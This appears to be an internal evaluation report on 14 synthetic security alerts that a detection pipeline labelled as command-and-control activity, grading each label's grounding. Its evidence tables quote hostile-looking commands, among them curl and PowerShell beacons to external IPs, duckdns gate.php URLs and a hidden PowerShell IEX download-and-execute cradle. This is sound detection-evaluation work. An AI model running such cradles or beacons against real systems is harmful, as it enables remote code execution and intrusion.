# Phase NCE-8: Clean-Alert FEASIBLE Investigation (14 Cases)

Individual review of all 14 clean alerts with ≥1 FEASIBLE hypothesis from Phase NCE-8, applying the same three-tier classification used in the contaminated-side T1071 mislabeling investigation.

**Classification criteria (identical to contaminated investigation):**
- **REASONABLE:** Raw evidence contains explicit, unambiguous C2-shaped telemetry (beaconing commands to external IPs, `category=CommandAndControl`) that a human analyst would also read as T1071-shaped. NCE's label is well-grounded; the FEASIBLE status is the expected Factor 1 outcome.
- **QUESTIONABLE:** Weak/ambiguous evidence, non-C2 SIEM category, no explicit network beaconing, typically low NCE confidence. T1071 label is an over-reach — the clean-side mirror of Factor 2.
- **UNEXPECTED:** Doesn't fit the established T1071 pattern at all — would require its own investigation.

---

## Per-Alert Evidence Table

### Case 1 — Alert 1125281436175 → **REASONABLE**

| Field | Value |
|:---|:---|
| Account / Host | m.chen / WKSTN-4520 |
| Target (NCE) | 185.105.125.147 |
| nce_confidence | 0.88 |
| path_confidence | 1.0 |
| Grade | BenignPositive |
| `_ground_truth_is_contaminated` | **False ✓** |
| `command_line` | `curl.exe -s http://185.105.125.147:8443/checkin?id=1934` |
| `raw_log_line` | `category=CommandAndControl entity=Url verdict=Suspicious \| url=https://2397.duckdns.org/gate.php device=WKSTN-4520 user=m.chen` |
| Evidence refs | `['command_line', 'raw_log_line']` |

**Assessment:** Explicit `curl` beaconing to external 185.x IP with `category=CommandAndControl`. Also has a duckdns.org URL in `raw_log_line` (see duckdns deep-dive below — this is a recurring synthetic data pattern). NCE correctly extracted the IP as target. Classic Factor 1.

---

### Case 2 — Alert 1228360648674 → **REASONABLE**

| Field | Value |
|:---|:---|
| Account / Host | helpdesk_admin / WKSTN-8528 |
| Target (NCE) | 185.116.61.121 |
| nce_confidence | 0.92 |
| path_confidence | 1.0 |
| Grade | TruePositive |
| `_ground_truth_is_contaminated` | **False ✓** |
| `command_line` | `powershell.exe -c "Invoke-WebRequest -Uri http://185.116.61.121/beacon -Method POST"` |
| `raw_log_line` | `category=CommandAndControl entity=Url verdict=nan \| url=https://3011.duckdns.org/gate.php device=WKSTN-8528 user=helpdesk_admin` |
| Evidence refs | `['command_line', 'raw_log_line']` |

**Assessment:** Explicit `Invoke-WebRequest` to external 185.x IP with POST beacon + `category=CommandAndControl`. Also has duckdns URL in raw_log (same synthetic pattern as Case 1). Classic Factor 1.

---

### Case 3 — Alert 1357209669266 → **REASONABLE**

| Field | Value |
|:---|:---|
| Account / Host | svc_backup / WKSTN-6188 |
| Target (NCE) | 185.208.133.128 |
| nce_confidence | 0.88 |
| path_confidence | 1.0 |
| Grade | BenignPositive |
| `_ground_truth_is_contaminated` | **False ✓** |
| `command_line` | `curl.exe -s http://185.208.133.128:8443/checkin?id=9091` |
| `raw_log_line` | `category=CommandAndControl entity=Url verdict=Suspicious \| url=https://5519.duckdns.org/gate.php device=WKSTN-6188 user=svc_backup` |
| Evidence refs | `['command_line', 'raw_log_line']` |

**Assessment:** Explicit `curl` beaconing + `category=C2` + duckdns URL. Classic Factor 1.

---

### Case 4 — Alert 1382979471619 → **REASONABLE** ⚑ DuckDNS target case

| Field | Value |
|:---|:---|
| Account / Host | m.chen / LT-9404-CORP |
| Target (NCE) | **6105.duckdns.org** |
| nce_confidence | 0.92 |
| path_confidence | 1.0 |
| Grade | BenignPositive |
| `_ground_truth_is_contaminated` | **False ✓** |
| `command_line` | `powershell.exe -c "Invoke-WebRequest -Uri http://185.248.234.172/beacon -Method POST"` |
| `raw_log_line` | `category=CommandAndControl entity=Url verdict=nan \| url=https://6105.duckdns.org/gate.php device=LT-9404-CORP user=m.chen` |
| Evidence refs | `['command_line', 'raw_log_line']` |

**Assessment:** See [DuckDNS Deep-Dive](#duckdns-deep-dive) below. REASONABLE — strong C2 evidence; the target extraction difference is cosmetic.

---

### Case 5 — Alert 1589137903279 → **REASONABLE**

| Field | Value |
|:---|:---|
| Account / Host | jsmith / SRV-FILE9639 |
| Target (NCE) | 185.97.111.42 |
| nce_confidence | 0.88 |
| path_confidence | 1.0 |
| Grade | BenignPositive |
| `_ground_truth_is_contaminated` | **False ✓** |
| `command_line` | `powershell.exe -c "Invoke-WebRequest -Uri http://185.97.111.42/beacon -Method POST"` |
| `raw_log_line` | `category=CommandAndControl entity=Url verdict=nan \| url=http://185.97.111.42:8080/beacon device=SRV-FILE9639 user=jsmith` |
| Evidence refs | `['command_line', 'raw_log_line']` |

**Assessment:** Explicit `Invoke-WebRequest` to 185.x IP + `category=C2`. Classic Factor 1.

---

### Case 6 — Alert 1597727837376 → **QUESTIONABLE**

| Field | Value |
|:---|:---|
| Account / Host | a.patel / SRV-FILE8764 |
| Target (NCE) | **359205** (invalid — synthetic numeric string, not a real IP) |
| nce_confidence | **0.45** |
| path_confidence | 1.0 |
| Grade | FalsePositive |
| `_ground_truth_is_contaminated` | **False ✓** |
| `command_line` | `C:\Program Files\Common Files\svc_7763.exe` (generic service executable) |
| `raw_log_line` | `category=InitialAccess entity=Ip verdict=nan \| remote_ip=359205 device=SRV-FILE8764 process=powershell.exe` |
| Evidence refs | `['raw_log_line', 'process_name']` |
| Missing context flags | `['network_reachability']` |

**Assessment:** No beaconing command, no C2 category, no real external IP. `remote_ip=359205` is a synthetic invalid number (not a valid IPv4 address). NCE inferred T1071 from the presence of `remote_ip` and `powershell.exe` in a non-C2 context. Low confidence (0.45) and `network_reachability` flag signal NCE's own uncertainty. **Clean-side Factor 2.**

---

### Case 7 — Alert 1614907703806 → **QUESTIONABLE**

| Field | Value |
|:---|:---|
| Account / Host | a.patel / LT-3907-CORP |
| Target (NCE) | unknown |
| nce_confidence | **0.62** |
| path_confidence | 1.0 |
| Grade | BenignPositive |
| `_ground_truth_is_contaminated` | **False ✓** |
| `command_line` | `C:\Program Files\Common Files\svc_4372.exe` (generic service executable) |
| `raw_log_line` | `category=InitialAccess entity=Ip verdict=nan \| remote_ip=6273 device=LT-3907-CORP process=outlook.exe` |
| Evidence refs | `['raw_log_line', 'file_path']` |
| Missing context flags | `['network_reachability']` |

**Assessment:** No beaconing, no C2 category, `remote_ip=6273` is another synthetic invalid number. Process is `outlook.exe`. NCE's T1071 inference is weakly grounded. **Clean-side Factor 2.**

---

### Case 8 — Alert 171798695635 → **REASONABLE**

| Field | Value |
|:---|:---|
| Account / Host | a.patel / WKSTN-5601 |
| Target (NCE) | 185.199.211.188 |
| nce_confidence | 0.92 |
| path_confidence | 1.0 |
| Grade | BenignPositive |
| `_ground_truth_is_contaminated` | **False ✓** |
| `command_line` | `powershell.exe -c "Invoke-WebRequest -Uri http://185.199.211.188/beacon -Method POST"` |
| `raw_log_line` | `category=CommandAndControl entity=Process verdict=Suspicious \| process=svchost.exe cmdline="powershell.exe ..." device=WKSTN-5601 user=a.patel` |
| Evidence refs | `['command_line', 'raw_log_line']` |

**Assessment:** Explicit `Invoke-WebRequest` + `category=C2`. Classic Factor 1.

---

### Case 9 — Alert 257698039607 → **REASONABLE**

| Field | Value |
|:---|:---|
| Account / Host | svc_backup / LT-5119-CORP |
| Target (NCE) | 185.68.192.212 |
| nce_confidence | 0.85 |
| path_confidence | 1.0 |
| Grade | TruePositive |
| `_ground_truth_is_contaminated` | **False ✓** |
| `command_line` | `powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://185.68.192.212/m.ps1')"` |
| `raw_log_line` | `category=CredentialAccess entity=User verdict=nan \| account=svc_backup device=LT-5119-CORP` |
| Evidence refs | `['command_line']` |

**Assessment:** Explicit `IEX DownloadString` from external 185.x IP — classic PowerShell cradle/C2 loader. Note: raw_log category is `CredentialAccess` (not `CommandAndControl`), creating a slight mismatch, but the command_line itself is unambiguous C2/download activity. NCE correctly cited `command_line` only (not `raw_log_line`). High confidence (0.85) is justified by the command content. **REASONABLE** despite the category mismatch — the evidence that NCE actually cited is strong.

---

### Case 10 — Alert 335007452396 → **REASONABLE**

| Field | Value |
|:---|:---|
| Account / Host | m.chen / LT-7727-CORP |
| Target (NCE) | 185.144.86.77 |
| nce_confidence | 0.85 |
| path_confidence | 1.0 |
| Grade | BenignPositive |
| `_ground_truth_is_contaminated` | **False ✓** |
| `command_line` | `curl.exe -s http://185.144.86.77:8443/checkin?id=7603` |
| `raw_log_line` | `category=CommandAndControl entity=Process verdict=Suspicious \| process=powershell.exe cmdline="curl.exe -s ..." device=LT-7727-CORP user=m.chen` |
| Evidence refs | `['command_line', 'raw_log_line']` |

**Assessment:** Explicit `curl` beaconing + `category=C2`. Classic Factor 1.

---

### Case 11 — Alert 395136991850 → **QUESTIONABLE**

| Field | Value |
|:---|:---|
| Account / Host | svc_backup / LT-2732-CORP |
| Target (NCE) | unknown |
| nce_confidence | **0.45** |
| path_confidence | 1.0 |
| Grade | BenignPositive |
| `_ground_truth_is_contaminated` | **False ✓** |
| `command_line` | `C:\Program Files\Common Files\svc_4129.exe` (generic service executable) |
| `raw_log_line` | `category=Impact entity=Ip verdict=nan \| remote_ip=6420 device=LT-2732-CORP process=outlook.exe` |
| Evidence refs | `['raw_log_line', 'process_name']` |
| Missing context flags | `['network_reachability', 'target_criticality']` |

**Assessment:** No beaconing, no C2 category, `remote_ip=6420` is synthetic/invalid. Process is `outlook.exe`. NCE's T1071 is weakly grounded. Two missing-context flags. **Clean-side Factor 2.**

---

### Case 12 — Alert 566935684681 → **QUESTIONABLE** ⚑ Self-referencing WKSTN case

| Field | Value |
|:---|:---|
| Account / Host | helpdesk_admin / WKSTN-2278 |
| Target (NCE) | **WKSTN-2278** (= source_host) |
| nce_confidence | **0.45** |
| path_confidence | 1.0 |
| Grade | TruePositive |
| `_ground_truth_is_contaminated` | **False ✓** |
| `command_line` | `C:\Program Files\Common Files\svc_9301.exe` (generic service executable) |
| `raw_log_line` | `category=Exfiltration entity=File verdict=nan \| file_path="C:\Users\helpdesk_admin\AppData\Local\Temp\archive_9380.zip" device=WKSTN-2278 user=helpdesk_admin` |
| Evidence refs | `['raw_log_line', 'file_path']` |
| Missing context flags | `['network_reachability']` |

**Assessment:** See [Self-Referencing WKSTN Deep-Dive](#self-referencing-wkstn-deep-dive) below. QUESTIONABLE — NCE extraction artifact.

---

### Case 13 — Alert 584115555473 → **QUESTIONABLE**

| Field | Value |
|:---|:---|
| Account / Host | a.patel / LT-9315-CORP |
| Target (NCE) | unknown |
| nce_confidence | **0.85** ← notably high for weak evidence |
| path_confidence | 1.0 |
| Grade | BenignPositive |
| `_ground_truth_is_contaminated` | **False ✓** |
| `command_line` | `wscript.exe C:\Users\Public\Downloads\invoice_3916.vbs` |
| `raw_log_line` | `category=Execution entity=File verdict=nan \| file_path="C:\Users\a.patel\Documents\file_7813.tmp" device=LT-9315-CORP user=a.patel` |
| Evidence refs | `['process_name', 'command_line', 'raw_log_line']` |
| Missing context flags | `['target_privilege_level', 'network_reachability']` |

**Assessment:** No external IP, no beaconing command, category is `Execution` (not C2/network). The VBS script execution from `Public\Downloads` is suspicious for malware staging but contains **zero network indicators**. NCE generated a T1071 hypothesis from non-network evidence at **0.85 confidence** — the highest-confidence QUESTIONABLE case in this entire set. This is a more concerning Factor 2 instance than the low-confidence cases (6, 7, 11, 12, 14) because the confidence score does not reflect the complete absence of network evidence for an Application Layer Protocol technique. Worth noting as the strongest argument for an NCE evidentiary threshold.

---

### Case 14 — Alert 962072675584 → **QUESTIONABLE**

| Field | Value |
|:---|:---|
| Account / Host | helpdesk_admin / SRV-FILE5872 |
| Target (NCE) | unknown |
| nce_confidence | **0.35** (lowest in entire set) |
| path_confidence | 1.0 |
| Grade | BenignPositive |
| `_ground_truth_is_contaminated` | **False ✓** |
| `command_line` | `C:\Program Files\Common Files\svc_5124.exe` (generic service executable) |
| `raw_log_line` | `category=Exfiltration entity=User verdict=nan \| account=helpdesk_admin device=SRV-FILE5872` |
| Evidence refs | `['raw_log_line', 'process_name']` |
| Missing context flags | `['network_reachability']` |

**Assessment:** No beaconing, no C2 category, no external IP, generic service executable. Lowest confidence in the set (0.35). NCE's T1071 is barely grounded. **Clean-side Factor 2.**

---

## Tier Summary

| Tier | Count | Proportion | Cases |
|:---|:---:|:---:|:---|
| **REASONABLE** | 8 | 57% | 1, 2, 3, 4, 5, 8, 9, 10 |
| **QUESTIONABLE** | 6 | 43% | 6, 7, 11, 12, 13, 14 |
| **UNEXPECTED** | 0 | 0% | — |

**Contaminated-side comparison:** The original 16 contaminated failures were 12 REASONABLE (75%) / 4 QUESTIONABLE (25%) / 0 UNEXPECTED. The clean-side ratio is shifted toward QUESTIONABLE (43% vs 25%), which is expected — clean alerts have less genuine C2 telemetry on average, so a larger fraction of NCE's T1071 generation is speculative.

---

## DuckDNS Deep-Dive

### Finding: DuckDNS URLs are a standard synthetic data pattern, not a special case

The "duckdns.org" target in Case 4 (alert 1382979471619) is **not** a structurally distinct pattern from the dominant curl/Invoke-WebRequest-to-185.x cases. Examination reveals:

**Cases 1, 2, 3, and 4 ALL contain duckdns.org URLs in their `raw_log_line`:**

| Case | Alert | `raw_log_line` URL | `command_line` IP | NCE Target |
|:---:|:---|:---|:---|:---|
| 1 | 1125281436175 | `https://2397.duckdns.org/gate.php` | `185.105.125.147` | 185.105.125.147 |
| 2 | 1228360648674 | `https://3011.duckdns.org/gate.php` | `185.116.61.121` | 185.116.61.121 |
| 3 | 1357209669266 | `https://5519.duckdns.org/gate.php` | `185.208.133.128` | 185.208.133.128 |
| 4 | 1382979471619 | `https://6105.duckdns.org/gate.php` | `185.248.234.172` | **6105.duckdns.org** |

The `{N}.duckdns.org/gate.php` URL pattern is a standard component of the GUIDE dataset's `category=CommandAndControl` alerts — `synth_fields.py` generates these as part of the C2 telemetry template (realistic: real malware families like Emotet, Trickbot, AsyncRAT routinely use duckdns.org for C2 rendezvous, making it a well-established indicator in threat intelligence).

**The only difference between Case 4 and Cases 1-3 is an NCE target-extraction choice:** Cases 1-3 extracted the numeric IP from `command_line` as the target. Case 4 extracted the hostname from the `raw_log_line` URL instead. Both the IP and the duckdns hostname appear in the same alert — NCE simply picked a different field to source the target from.

**Verdict:** Case 4 is **REASONABLE** and fits the same Factor 1 mechanism as Cases 1-3. The duckdns.org hostname is not a new variant, dual-use ambiguity, or signal of anything different from the other C2-pattern alerts. It is the same synthetic C2 telemetry with a cosmetically different target extraction.

---

## Self-Referencing WKSTN Deep-Dive

### Finding: NCE extraction artifact, not a legitimate structural match

**Case 12 (alert 566935684681):** `target_host = WKSTN-2278 = source_host`

**Raw evidence analysis:**
- `command_line`: `C:\Program Files\Common Files\svc_9301.exe` — generic service executable, no network flags
- `raw_log_line`: `category=Exfiltration entity=File verdict=nan | file_path="...archive_9380.zip" device=WKSTN-2278 user=helpdesk_admin` — local file exfiltration alert, no external target
- `event_type`: `data_exfiltration`
- There is **no external IP**, **no beaconing command**, **no URL**, **no DNS query** anywhere in this alert

**What happened:**
1. The source alert's top-level `target_host` field is `WKSTN-2278` (the same as `source_host`). This is the GUIDE dataset's default when no distinct target host is present — the synthetic data generator sets `target_host = source_host` as a fallback.
2. NCE, when generating a T1071 hypothesis, needed a `target_host` value. With no external IP or hostname in the evidence, it used the alert's `target_host` field: `WKSTN-2278`.
3. SSE then evaluated T1071 feasibility for `WKSTN-2278 → WKSTN-2278`. Since WKSTN-2278 is in `zone:WORKSTATION`, and zone:WORKSTATION has outbound 443/80 egress, the T1071 constraint (`egress_to_any=True`) is satisfied → FEASIBLE.

**Is this a bug?** It is not a bug in SSE (SSE correctly answered the question asked — "does WKSTN-2278's zone have web egress?" → yes). It is an **NCE extraction artifact**: NCE generated a T1071 (network protocol) hypothesis from evidence that contains zero network indicators, using the source host as a fallback target. The low nce_confidence (0.45) and `missing_context_flags=['network_reachability']` both signal NCE's own awareness that the hypothesis is weakly grounded.

**Is this a localhost/loopback service call?** No — there is no evidence of any local web server, loopback connection, or intra-host HTTP call. The alert is about file staging (`archive_*.zip`), not network activity.

**Classification:** QUESTIONABLE — Factor 2. This would be prevented by the same NCE evidentiary threshold (require explicit network indicators before emitting T1071) flagged as future work.

---

## Revised Overall Verdict

### Does "0/60 non-T1071 false positives" still hold?

> **Yes — technically correct and unqualified.** All 14 FEASIBLE hypotheses across 50 clean alerts are T1071. Zero instances of any other technique being marked FEASIBLE on clean data. The claim "0/60 (0.0%) non-T1071 false positives" is factually accurate.

### Does the investigation reveal caveats worth documenting?

> **Yes — the same Factor 2 over-reach documented on the contaminated side is present on the clean side, in similar proportion.**

The 14 FEASIBLE clean alerts decompose into the same two-factor structure as the 16 contaminated failures:

| Factor | Contaminated (n=16) | Clean (n=14) |
|:---|:---:|:---:|
| **Factor 1** (genuine C2 evidence + zone-egress) | 12 (75%) | 8 (57%) |
| **Factor 2** (NCE over-reach, weak evidence) | 4 (25%) | 6 (43%) |
| **Factor 3** (hallucinated label) | 0 (0%) | 0 (0%) |

The clean-side FEASIBLE count is inflated by Factor 2: 6 of the 14 FEASIBLE alerts have no genuine C2 evidence and would not produce T1071 hypotheses under disciplined NCE generation.

**Adjusted estimates under perfect NCE discipline:**
- Raw NCE-8 FEASIBLE rate: 14/50 (28.0%)
- Factor-1-only rate (excluding Factor 2 over-reach): 8/50 (16.0%)
- Combined with NCE-7-SCALE (n=10, 2 FEASIBLE): ~10/60 (16.7%) — representing the irreducible architectural floor from genuine C2-shaped telemetry in the dataset

### One notable case worth explicit mention

> **Case 13 (alert 584115555473):** NCE generated a T1071 hypothesis with **0.85 confidence** from evidence containing zero network indicators (`wscript.exe` executing a VBS file, `category=Execution`). This is the most concerning Factor 2 instance because the high confidence does not match the evidence quality. All other QUESTIONABLE cases have confidence ≤ 0.62. This strengthens the argument for an NCE evidentiary threshold: even on clean data, NCE occasionally assigns high confidence to poorly-grounded network-technique hypotheses.

### Bottom line

The "0/60 non-T1071 FP rate" headline is **correct and can be cited as-is**. However, the 28.0% alert-level T1071 FEASIBLE rate on clean data should be reported with the caveat that ~43% of those cases (6/14) are Factor 2 (NCE over-reach) rather than Factor 1 (genuine structural limitation), and the Factor-1-only rate is closer to 16%. The three-factor breakdown established on the contaminated side applies symmetrically to the clean side.
